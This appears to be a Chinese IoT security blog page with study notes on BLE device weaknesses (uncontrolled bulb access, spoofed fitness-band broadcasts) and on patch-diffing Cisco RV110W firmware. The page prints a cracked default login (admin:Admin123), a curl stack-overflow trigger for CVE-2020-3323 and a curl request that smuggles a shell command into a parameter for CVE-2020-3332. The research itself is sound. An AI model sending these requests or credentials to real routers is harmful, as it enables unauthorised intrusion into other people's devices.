class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># a200，这是主程序</span></span><br><span class="line"><span class="comment"># 注意到：MINIFS字符串</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ hexdump a200.lzma -C |tail</span><br><span class="line">000b6290  39 30 5a fb 6f 5c 65 63  97 42 d1 69 e3 13 e5 ba  |90Z.o\ec.B.i....|</span><br><span class="line">000b62a0  03 0b ba 40 fb 20 27 05  c2 c4 64 d9 fe 98 78 de  |...@. <span class="string">'...d...x.|</span></span><br><span class="line"><span class="string">000b62b0  be 68 ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |.h..............|</span></span><br><span class="line"><span class="string">000b62c0  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span></span><br><span class="line"><span class="string">*</span></span><br><span class="line"><span class="string">000b7000  4d 49 4e 49 46 53 00 00  00 00 00 00 00 00 00 00  |MINIFS..........|</span></span><br><span class="line"><span class="string">000b7010  00 00 00 02 00 00 00 86  00 01 f4 00 00 07 55 7c  |..............U||</span></span><br><span class="line"><span class="string">000b7020  92 1c 64 4e ae 88 d9 d2  2d b4 48 ce 5c eb 69 51  |..dN....-.H.\.iQ|</span></span><br><span class="line"><span class="string">000b7030  00 00 04 8d 00 00 00 20  00 00 06 c3 00 00 00 00  |....... ........|</span></span><br><span class="line"><span class="string">000b7040</span></span><br></pre></td></tr></table></figure>
<ul>
<li>问题<ul>
<li>68与75识别函数数量不同，why？</li>
<li>80001000加载基址怎么出来的？（见01-5-ida加载</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考</p>
<ul>
<li><a href="https://cq674350529.github.io/2018/09/19/TP-Link-wr886v6-固件解析/" target="_blank" rel="noopener">https://cq674350529.github.io/2018/09/19/TP-Link-wr886v6-固件解析/</a></li>
<li><a href="https://www.secpulse.com/archives/75635.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/75635.html</a></li>
</ul>
</blockquote>
<p># </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/04/20/iot/BLE设备的安全分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/20/iot/BLE设备的安全分析/" class="post-title-link" itemprop="url">BLE设备的安全分析</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-20 09:23:44" itemprop="dateCreated datePublished" datetime="2021-04-20T09:23:44+08:00">2021-04-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-21 15:12:14" itemprop="dateModified" datetime="2022-02-21T15:12:14+08:00">2022-02-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[TOC]</p>
<h1 id="BLE设备的安全分析"><a href="#BLE设备的安全分析" class="headerlink" title="BLE设备的安全分析"></a>BLE设备的安全分析</h1><h2 id="BLE基础知识"><a href="#BLE基础知识" class="headerlink" title="BLE基础知识"></a>BLE基础知识</h2><ul>
<li>概要：蓝牙、BLE协议栈、Android API</li>
<li><p>专题有两个主线：BLE设备、智能门锁的安全研究</p>
</li>
<li><p>蓝牙，即Bluetooth，有两种形式</p>
<ul>
<li>传统蓝牙BR（Basic Rate），蓝牙耳机/音箱</li>
<li>低功耗蓝牙BLE（Bluetooth Low Energy），各种IoT设备，如蓝牙手环等。</li>
</ul>
</li>
<li><p>蓝牙的数据传输模型：Physical层、Logical层和L2CAP层</p>
<ul>
<li>类比OSI七层协议：发送时，高层应用将数据发送给L2CAP层，并逐层向下流动；接收时，设备从Physical层获得数据，并逐层向上流动</li>
<li>L2CAP层：高层应用中需要收发的BLE数据在此，这些数据可能在应用层中被加密，但没有被BLE协议栈加密</li>
<li>Physical层：3个广播信道和37个数据通信信道。两个BLE设备连接时，随机挑选一个广播信道进行广播，连接建立后，在37个通信信道上跳频通信</li>
<li>Logical层：完成BLE通信过程中的各种逻辑控制。BLE通信过程存在master（主动扫描并发起连接）和slave（不断发送广播并等待连接）两方，scanner-扫描状态、advertiser-广播状态。</li>
</ul>
</li>
<li><p>IoT设备需要与Android/IOS手机通信，BLE是一种常见方式</p>
</li>
<li><p>蓝牙BLE通信</p>
<ul>
<li>扫描周围的蓝牙BLE设备，并选择，API：start/stopScan</li>
<li>与设备通信，即收发数据，API：write/readCharacteristic</li>
</ul>
</li>
<li><p>相关概念</p>
<ul>
<li>每个BLE设备对应一个profile（描述设备）</li>
<li>一个profile包含多个service（设备提供的服务）</li>
<li>一个service有多个characteristic，service依靠characteristic来完成</li>
<li>Service和Characteristic各自拥有一个标识UUID，API利用UUID找到service和characteristic</li>
</ul>
</li>
</ul>
<h2 id="BLE灯泡"><a href="#BLE灯泡" class="headerlink" title="BLE灯泡"></a>BLE灯泡</h2><ul>
<li><p>概要：app日志分析获取ble通信数据、nRF conent与设备通信、不经绑定直接控制灯泡</p>
</li>
<li><p>获取BLE通信内容3法</p>
<ul>
<li>HCI Log：Android系统提供，包含蓝牙的所有日志</li>
<li>app分析：逆向app，查看其日志/Hook关键函数</li>
<li>BLE嗅探：直接嗅探周围BLE通信的数据</li>
</ul>
</li>
<li><p>app日志分析</p>
<ul>
<li>本设备较简单，app日志直接打印出BLE通信内容</li>
<li>App日志可以通过DDMS、ADB或其他工具查看，如AndroidKiller</li>
<li>多次调整亮度，对比多条日志，找异同点</li>
<li>有一个字节与亮度成线性相关</li>
</ul>
</li>
<li><p>BLE数据包格式</p>
<ul>
<li>灯泡的MAC地址</li>
<li>Service/Characteristic UUID</li>
<li>通信内容</li>
</ul>
</li>
<li><p>nRF Connect</p>
<ul>
<li>调试BLE设备的免费app，iOS/Android两个版本</li>
<li>3功能：作为master扫描周围设备、与BLE设备通信、作为Advertiser发送广播包</li>
</ul>
</li>
<li><p>nRF Connect控制灯泡</p>
<ul>
<li>通过MAC地址，找到灯泡</li>
<li>与灯泡建立BLE连接，找到Service/Characteristic的UUID</li>
<li>向Characteristic写入控制灯泡亮度的通信数据</li>
</ul>
</li>
<li><p>绑定的逻辑缺陷</p>
<ul>
<li>理想情况：每个BLE灯泡都必须完成绑定之后，才能正常使用</li>
<li>绕过：app与设备之间并没有严格的绑定关系，仅仅是app本地登记一下灯泡，单向登记并非双向绑定</li>
</ul>
</li>
</ul>
<h2 id="BLE智能手环"><a href="#BLE智能手环" class="headerlink" title="BLE智能手环"></a>BLE智能手环</h2><ul>
<li><p>概要：dongle重刷固件、伪造广播数据</p>
</li>
<li><p>手环通信方式</p>
<ul>
<li>猜测通过WiFi/4G，但并没有相关设置</li>
<li>有关于BLE通信的设置，故判断依靠BLE通信</li>
</ul>
</li>
<li><p>步数上报服务器</p>
<ul>
<li>假设1：手环不停广播，某个设备扫描附近的广播数据</li>
<li>假设2：某个设备以轮询的方式和手环建立连接、收集信息、断开连接</li>
<li>某个收集信息的设备，类似路由器，确实有“蓝牙路由器”相关产品</li>
<li>验证1：抓取手环的广播包</li>
<li>验证2：nRF connect连接手环，观察所有characteristic，看是否有可疑数据</li>
</ul>
</li>
<li><p>抓包验证1</p>
<ul>
<li>1：数据包类型为过滤条件，记录蓝牙MAC地址</li>
<li>2：换个位置，重新抓包。对比两次抓包，发现某MAC出现两次，即手环</li>
<li>3：手环MAC为过滤条件，广播数据+手环步数=广播的第9字节为步数</li>
<li>工具：sniffer+dongle，nRF connect也可</li>
</ul>
</li>
<li><p>伪造广播数据</p>
<ul>
<li>nRF connect可发送BLE广播，但受限于Android系统，不能设置MAC地址</li>
<li>需要一个自由度更高的设备，dongle可以，但需重刷固件</li>
<li>dongle固件刷写后，可伪造成手环（设置mac地址），广播自定义的步数数据</li>
</ul>
</li>
<li><p>重构工程</p>
<ul>
<li>dongle采用CC2540芯片（8051的CPU内核），故IAR For 8051作为IDE</li>
<li>芯片开发包中，找到蓝牙广播样例程序</li>
<li>调整代码，即设置广播数据，并编译工程</li>
<li>编译后，刷写dongle，覆盖其原本固件（firmware文件夹有备份）</li>
</ul>
</li>
<li><p>dongle重刷固件</p>
<ul>
<li>cc debugger连接USB dongle和pc</li>
<li>SmartRF Flash Programmer工具（sniffer同系列）</li>
<li>设置MAC地址为手环的，Location选择Secondary</li>
<li><p>Primary保存出厂MAC地址，无法更改</p>
</li>
<li><p>Secondary保存自定义MAC地址，若存在会优先使用</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：</p>
<ul>
<li><a href="https://www.4hou.com/posts/o6LY" target="_blank" rel="noopener">https://www.4hou.com/posts/o6LY</a></li>
<li><a href="https://www.4hou.com/posts/Q549" target="_blank" rel="noopener">https://www.4hou.com/posts/Q549</a></li>
<li><a href="https://www.4hou.com/posts/GQy0" target="_blank" rel="noopener">https://www.4hou.com/posts/GQy0</a></li>
</ul>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/04/18/iot/通过补丁对比发现Cisco RV110W的多个漏洞/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/18/iot/通过补丁对比发现Cisco RV110W的多个漏洞/" class="post-title-link" itemprop="url">通过补丁对比发现Cisco RV110W的多个漏洞</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-18 14:41:33" itemprop="dateCreated datePublished" datetime="2021-04-18T14:41:33+08:00">2021-04-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-03-04 14:47:32" itemprop="dateModified" datetime="2022-03-04T14:47:32+08:00">2022-03-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="补丁对比法对Cisco-RV110W进行固件分析"><a href="#补丁对比法对Cisco-RV110W进行固件分析" class="headerlink" title="补丁对比法对Cisco RV110W进行固件分析"></a>补丁对比法对Cisco RV110W进行固件分析</h1><h2 id="上"><a href="#上" class="headerlink" title="上"></a>上</h2><h3 id="01-diff目录"><a href="#01-diff目录" class="headerlink" title="01-diff目录"></a>01-diff目录</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 记录目录及文件信息</span></span><br><span class="line"><span class="built_in">cd</span> _RV110W_FW_1.2.2.8.bin.extracted/squashfs-root</span><br><span class="line">find . -<span class="built_in">type</span> f -<span class="built_in">print</span> | sort -u | xargs md5sum &gt; /tmp/1.2.2.8.md5</span><br><span class="line"><span class="built_in">cd</span> _RV110W_FW_1.2.2.5.bin.extracted/squashfs-root</span><br><span class="line">find . -<span class="built_in">type</span> f -<span class="built_in">print</span> | sort -u | xargs md5sum &gt; /tmp/1.2.2.5.md5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令解读：find . -type f -print | sort -u | xargs md5sum **&gt;** /tmp/1.2.2.8.md5</span></span><br><span class="line">- -<span class="built_in">print</span>：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式为每列一个名称，每个名称前皆有“./”字符串；</span><br><span class="line">- sort排序，-u 意味着是唯一的(unique)，输出的结果是去完重了的。</span><br><span class="line">- `xargs`命令的作用，是将标准输入转为命令行参数，如$ <span class="built_in">echo</span> <span class="string">"hello world"</span> | xargs <span class="built_in">echo</span>（本可以用｜管道符，但大多数命令都不接受标准输入作为参数，如<span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># diff以逐行的方式，比较文本文件的异同处</span></span><br><span class="line">diff /tmp/1.2.2.8.md5 /tmp/1.2.2.5.md5</span><br></pre></td></tr></table></figure>
<ul>
<li>读懂diff结果：<a href="http://www.ruanyifeng.com/blog/2012/08/how_to_read_diff.html，举例：4c、\" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2012/08/how_to_read_diff.html，举例：4c、\</a>&lt; a、-–、> b<ul>
<li>4c4：它分成三个部分：前面的”4”，表示f1的第4行有变化；中间的”c”表示变动的模式是内容改变（change），其他模式还有”增加”（a，代表addition）和”删除”（d，代表deletion）；后面的”4”，表示变动后变成f2的第4行。</li>
<li>&lt; a：前面的小于号，表示要从f1当中去除该行（也就是第4行），后面的”a”表示该行的内容。</li>
<li>> b：前面的大于号表示f2增加了该行，后面的”b”表示该行的内容。</li>
<li>也就表示，第4行有修改，旧文件第四行删掉a，又在第四行增加b</li>
</ul>
</li>
</ul>
<ul>
<li><p>316d316、&lt; d9a523641b71ff29baf20be8fcaced0c  ./usr/sbin/utelnetd</p>
<ul>
<li>删除了316行，删除了<em>utelnetd</em>二进制文件</li>
<li>It makes sense given that this service can’t be enabled from the web UI. Probably an artifact left from internal testing.</li>
<li>新版本删掉它是合理的，因为无法从web界面启动它，可能当时为了测试留下的</li>
</ul>
</li>
</ul>
<h3 id="02-utelnetd"><a href="#02-utelnetd" class="headerlink" title="02-utelnetd"></a>02-utelnetd</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Anyway, *utelnetd* - like any good unix tool - rely on */bin/login* to authenticate users. It’s a built-in binary that uses */etc/shadow* to authenticate users. The shadow file is absent from the firmware squashfs file system so it must be generated when the device boots up.</span><br></pre></td></tr></table></figure>
<ul>
<li><em>utelnetd</em>像其他Unix工具一样，都依靠<em>/ bin / login</em>来进行用户认证</li>
<li><em>/ bin / login</em>是一个内置的二进制文件，使用<em>/ etc / shadow</em>对用户进行身份验证。</li>
<li>固件squashfs文件系统中没有shadow文件，因此必须在设备启动时生成该shadow文件。</li>
</ul>
<h3 id="03-获取hash"><a href="#03-获取hash" class="headerlink" title="03-获取hash"></a>03-获取hash</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 哪里引用shadow</span></span><br><span class="line"><span class="comment"># （-r递归、当前目录下所有文件、搜内容</span></span><br><span class="line"><span class="comment"># （/sbin/rc在Linux初始化过程中执行</span></span><br><span class="line">grep <span class="string">'etc/shadow'</span> . -r</span><br><span class="line">Binary file ./squashfs-root/bin/busybox matches</span><br><span class="line">Binary file ./squashfs-root/sbin/rc matches</span><br><span class="line">Binary file ./squashfs-root/lib/libc.so.0 matches</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定文件中搜字符串</span></span><br><span class="line"><span class="comment"># （静态默认凭据属于admin用户</span></span><br><span class="line"><span class="comment"># （只有该密码的md5crypt 哈希值</span></span><br><span class="line">strings ./squashfs-root/sbin/rc | grep shadow</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'admin:$1$aUzX1IiE$x2rSbqyggRaYAJgSRJ9uC.:15880:0:99999:7:::'</span> &gt; /etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># hash解密</span></span><br><span class="line"><span class="comment"># （直接在线解密：https://www.somd5.com，也能得到</span></span><br><span class="line"><span class="comment"># （未探究hashcat用法</span></span><br><span class="line">hashcat -O -w 4 --status -m 500 /tmp/rv110.txt /tmp/rockyou.txt -r /tmp/InsidePro-PasswordsPro.rule  --show</span><br><span class="line"><span class="variable">$1</span><span class="variable">$aUzX1IiE</span><span class="variable">$x2rSbqyggRaYAJgSRJ9uC</span>.:Admin123</span><br></pre></td></tr></table></figure>
<h3 id="04-总结"><a href="#04-总结" class="headerlink" title="04-总结"></a>04-总结</h3><ul>
<li><p>综上，信息泄漏：默认账号密码：admin:Admin123（25版本有，28版本没有</p>
</li>
<li><p>流程</p>
<ul>
<li>通过文件hash对比，发现删掉了<em>utelnetd</em></li>
<li><em>utelnetd</em>通过<em>/ bin / login</em>来进行用户认证（他又通过<em>/etc/shadow</em> </li>
<li>shadow默认没有，必须在设备启动时生成该shadow文件。</li>
<li>搜索字符串找到/sbin/rc文件，其在Linux初始化中执行</li>
<li>/sbin/rc中找到admin及其hash值，解密</li>
</ul>
</li>
</ul>
<h2 id="下"><a href="#下" class="headerlink" title="下"></a>下</h2><h3 id="version-track"><a href="#version-track" class="headerlink" title="version_track"></a>version_track</h3><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><ul>
<li><p>ghidra导入库</p>
<ul>
<li>提供库搜索路径，以便Ghidra也可以加载与二进制文件动态链接的系统库。</li>
<li>options、load external libraries、eidt path、+</li>
<li>添加：<em>/lib</em> 和 <em>/usr/lib</em></li>
</ul>
</li>
<li><p>要先分析</p>
<ul>
<li>将每个文件加载到项目中后，双击它们并执行自动分析。</li>
<li><p>分析完成后，保存文件并返回主窗口。（file-save或command + s</p>
</li>
<li><p>既然我们的二进制文件已经由Ghidra进行了分析，我们就可以启动版本跟踪会话。</p>
</li>
<li>根据您的喜好命名会话，并将两种版本的<em>httpd</em>都设置为源程序和目标程序：</li>
<li>分析后才能进行版本追踪 </li>
</ul>
</li>
</ul>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><ul>
<li>大致流程<ul>
<li>脚印图标、file、new session、命名、指定源/目标、开始图标来test、next/finish</li>
<li>finish后，共3个窗口：version track主窗口、源/目的工具</li>
<li>主窗口-魔术棒图标来自动分析</li>
<li>过滤</li>
</ul>
</li>
<li>设置过滤：过滤器图标（match table 而非markup item table）<ul>
<li>match type：去掉data</li>
<li>symbol type：全选</li>
<li>Association Status：只选available</li>
<li>Algorithm：只Implied Match</li>
<li>address range：默认即可</li>
<li>（其他选项待查看帮助</li>
</ul>
</li>
</ul>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><ul>
<li>decompile view：<ul>
<li>总是超时失败：Exception while decompiling 0040c400: process: timeout（推测超时原因：函数本身比较大、指定了lib库牵涉的文件多</li>
<li>设置timeout时间：<a href="https://reverseengineering.stackexchange.com/questions/20828/how-to-increase-decompilation-timeout-in-ghidra（在打开二进制文件的窗口中才有这选项，edit-tool" target="_blank" rel="noopener">https://reverseengineering.stackexchange.com/questions/20828/how-to-increase-decompilation-timeout-in-ghidra（在打开二进制文件的窗口中才有这选项，edit-tool</a> option-decompiler，而且不同文件间是独立的</li>
<li>不用version track的反编译了，直接ghidra反编译，然后修改超时时间为300，结合在线文本差异对比（version track会有三个窗口，修改源/目的文件的反编译超时时间，发现在主窗口没生效，故不用</li>
<li>（第二个函数可以反编译成功，观察，此窗口好像也没有差异对比功能</li>
</ul>
</li>
<li>过滤后结果</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 共2:FUN_0040c400-FUN_0040c460、FUN_0041d0b0-FUN_0041cde0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FUN_0040c400-FUN_0040c460</span></span><br><span class="line">strcpy变为strncpy，限制了长度，防止栈溢出</span><br><span class="line"></span><br><span class="line"><span class="comment"># FUN_0041d0b0-FUN_0041cde0</span></span><br><span class="line"><span class="comment"># 多加了一个对“.cfgi”的strstr过滤，防止信息泄漏（CVE-2020-3150信息泄漏是通过访问/startup.cfg实现的、asp-cgi-txt都是防止直接返回内容的后缀</span></span><br><span class="line">__s1_00 = strstr(pcParm1,<span class="string">".asp"</span>);</span><br><span class="line"><span class="keyword">if</span> (((((__s1_00 != (char *)0x0) || (__s1_00 = strstr(pcParm1,<span class="string">".cgi"</span>), __s1_00 != (char *)0x0)) ||</span><br><span class="line">       (__s1_00 = strstr(pcParm1,<span class="string">".txt"</span>), __s1_00 != (char *)0x0)) &amp;&amp;</span><br><span class="line">       </span><br><span class="line">__s1_00 = strstr(pcParm1,<span class="string">".asp"</span>);</span><br><span class="line">  <span class="keyword">if</span> (((((__s1_00 != (char *)0x0) || (__s1_00 = strstr(pcParm1,<span class="string">".cgi"</span>), __s1_00 != (char *)0x0)) ||</span><br><span class="line">       (__s1_00 = strstr(pcParm1,<span class="string">".txt"</span>), __s1_00 != (char *)0x0)) ||</span><br><span class="line">      (__s1_00 = strstr(pcParm1,<span class="string">".cfg"</span>), __s1_00 != (char *)0x0)) &amp;&amp;</span><br></pre></td></tr></table></figure>
<h3 id="bindiff"><a href="#bindiff" class="headerlink" title="bindiff"></a>bindiff</h3><h4 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h4><ul>
<li>bindiff分析：ghidra需要安装binexport，导出后再bindiff</li>
<li>安装binexport</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考：</span></span><br><span class="line">https://ihack4falafel.github.io/Patch-Diffing-with-Ghidra/、https://github.com/google/binexport/tree/master/java/BinExport</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载源码：</span></span><br><span class="line">https://github.com/google/binexport/tree/master/java/BinExport</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu下：（最终失败，转mac</span></span><br><span class="line">安装gradle构建工具：sudo apt  install gradle</span><br><span class="line"><span class="built_in">cd</span>到binexport/java/BinExport执行构建命令：gradle</span><br><span class="line">（失败，报错 Gradle version is 4.4.1. Minimum supported version is 5.6，用apt安装的是低版本，用snap安装的是6.6.1的，改用后者</span><br><span class="line">安装gradle构建工具：sudo snap  install gradle --classic（不加参数提示有风险，故加参数来确认安装</span><br><span class="line">要有ghidra的路径，gradle -PGHIDRA_INSTALL_DIR=~/Desktop/ghidra报错，Ubuntu下根本没有，所以转mac来build</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mac下</span></span><br><span class="line">安装gradle构建工具：brew install gradle</span><br><span class="line"><span class="built_in">cd</span>到/binexport/java/BinExport</span><br><span class="line">执行：gradle -PGHIDRA_INSTALL_DIR=/Applications/ghidra_9.0（mac下ghidra的真实路径</span><br><span class="line">报错：类文件具有错误的版本 55.0, 应为 52.0</span><br><span class="line">（更新ghidra为9.1.2也这样，暂搁置</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接下载编译好的：</span></span><br><span class="line">https://github.com/google/binexport/releases，搜索ghidra得到https://github.com/google/binexport/releases/download/v11/ghidra_BinExport.zip</span><br></pre></td></tr></table></figure>
<h4 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h4><ul>
<li>Finding CVE-2020-3323：栈溢出，unauthenticated, remote attacker to execute arbitrary code</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 排除前面的strcpy，因为漏洞描述是unauthenticated，但strcpy调用无法通过未经身份验证的上下文访问</span></span><br><span class="line"><span class="comment"># an insecure call to sscanf in the guest_logout_cgi function.为代码如下：</span></span><br><span class="line">char acStack172 [64];</span><br><span class="line">char acStack108 [68];</span><br><span class="line"></span><br><span class="line">char* cip = get_cgi(<span class="string">"cip"</span>);</span><br><span class="line">char* cmac = get_cgi(<span class="string">"cmac"</span>);</span><br><span class="line">char* submit_button = get_cgi(<span class="string">"submit_button"</span>);<span class="comment"># 获取post数据</span></span><br><span class="line"></span><br><span class="line">int v = strstr(submit_button,<span class="string">"status_guestnet.asp"</span>);</span><br><span class="line"><span class="keyword">if</span>(v != NULL)&#123;</span><br><span class="line">    // they<span class="string">'re looking for status_guestnet.asp;session_id=current_user_session_id_value</span></span><br><span class="line"><span class="string">    sscanf(submit_button,"%[^;];%*[^=]=%[^\n]",acStack108,acStack172);# 漏洞点</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 触发</span></span><br><span class="line"><span class="string">curl -ki -X POST https://192.168.1.43/guest_logout.cgi -d"cmac=00:01:02:03:04:05"-d "ip=192.168.1.1"-d "submit_button=status_guestnet.aspAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Finding CVE-2020-3332：命令注入，authenticated, remote attacker to inject arbitrary shell commands</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get_cgi读取post数据</span></span><br><span class="line">`pcVar2 = (char *)get_cgi(<span class="string">"sys_iperfWinSize"</span>);`</span><br><span class="line">`pcVar3 = (char *)get_cgi(<span class="string">"sys_iperfPort"</span>);`</span><br><span class="line"></span><br><span class="line"><span class="comment"># snprintf拼接字符串</span></span><br><span class="line">`snprintf(acStack112,0x50,<span class="string">"iperf %s -s -p %s -w %s -D &gt; /tmp/result.txt &amp;"</span>,__s1,pcVar3,pcVar2);`</span><br><span class="line"></span><br><span class="line"><span class="comment"># system执行</span></span><br><span class="line">`system(acStack112);`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发</span></span><br><span class="line">curl -ki -X POST <span class="string">'https://192.168.1.43/mfgtst.cgi?sys_iperfServer=1&amp;sys_iperfWinSize=1</span></span><br><span class="line"><span class="string">&amp;sys_iperfPort=80%7C%7Cping%20-c%203%2010.10.10.100%7C%7C&amp;sys_iperfMode=-u</span></span><br><span class="line"><span class="string">;session_id=0d00538ca990439d194ff8b294927e08'</span></span><br><span class="line">HTTP/1.1 200 Ok</span><br><span class="line">Server: httpd</span><br><span class="line">Date: Mon, 05 Oct 2020 10:31:09 GMT</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: 